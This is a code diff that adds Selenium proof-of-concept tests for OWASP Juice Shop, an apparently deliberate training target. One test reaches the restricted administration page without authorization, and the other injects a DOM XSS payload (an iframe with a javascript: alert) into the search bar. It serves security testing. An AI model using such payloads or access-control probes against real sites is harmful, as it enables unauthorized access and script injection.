@@ -98,6 +98,67 @@ public class JuiceShopTest {
             System.out.println("Regression Test Passed: The application rejected the SQLi payload.");
         }
     }
+    @Test
+    public void testBrokenAccessControlAdministrationPage() {
+        var driver = DriverManager.getDriver();
+        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));
+
+        // 1. Navigate directly to the restricted administration endpoint
+        driver.get(JuiceShopEnvironment.getBaseUrl() + "/#/administration");
+
+        try {
+            // 2. Look for an element that only exists on the admin page
+            // (e.g., the table displaying registered users)
+            WebElement adminTable = wait.until(ExpectedConditions.visibilityOfElementLocated(By.className("mat-table")));
+
+            // If the table loads, the unauthorized user successfully breached the page
+            Assert.assertTrue(adminTable.isDisplayed());
+            System.out.println("PoC Passed: Broken Access Control confirmed on /#/administration.");
+
+        } catch (org.openqa.selenium.TimeoutException e) {
+            // If the element never loads, the app correctly blocked access
+            Assert.fail("Access control enforced. The administration page was blocked.");
+        }
+    }
+
+    @Test
+    public void testDomXssSearchBar() throws InterruptedException {
+        var driver = DriverManager.getDriver();
+        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));
+
+        driver.get(JuiceShopEnvironment.getBaseUrl());
+
+// 1. Click the magnifying glass to open the search bar
+        WebElement searchIcon = wait.until(ExpectedConditions.elementToBeClickable(By.id("searchQuery")));
+        searchIcon.click();
+
+// 2. Wait half a second for the Angular expansion animation to finish
+        Thread.sleep(500);
+
+// 3. Inject your DOM XSS payload
+        String domXssPayload = "<iframe src=\"javascript:alert(`xss`)\">";
+
+// --- THE FIX ---
+// Instead of searching the DOM for a dynamic ID, just type into whatever element has the cursor!
+        WebElement searchInput = driver.switchTo().activeElement();
+// ---------------
+
+        searchInput.sendKeys(domXssPayload);
+        searchInput.sendKeys(org.openqa.selenium.Keys.ENTER);
+
+        // 3. Wait to see if the payload executes
+        try {
+            wait.until(ExpectedConditions.alertIsPresent());
+
+            Thread.sleep(3000); // Pause to demonstrate the alert
+            driver.switchTo().alert().accept(); // Clear it
+
+            System.out.println("PoC Passed: DOM XSS vulnerability confirmed in search bar.");
+
+        } catch (org.openqa.selenium.TimeoutException e) {
+            Assert.fail("The application successfully sanitized the search input.");
+        }
+    }
 
     @AfterMethod
     public void teardown() {
